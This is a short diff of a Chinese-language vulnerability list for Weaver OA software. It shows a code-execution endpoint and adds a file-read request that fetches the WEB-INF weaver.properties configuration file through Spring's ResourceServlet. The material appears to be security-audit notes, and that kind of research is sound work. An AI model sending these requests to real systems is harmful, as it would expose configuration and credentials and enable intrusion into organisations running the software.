@@ -64,6 +64,9 @@ GET /api/ec/dev/locale/getLabelByModule
 
 (13) 代码执行
 POST /api/integration/workflowflow/getInterfaceRegisterCustomOperation
+
+(14) 文件读取
+GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties
 ```
 
 ### 代码审计特点 ###
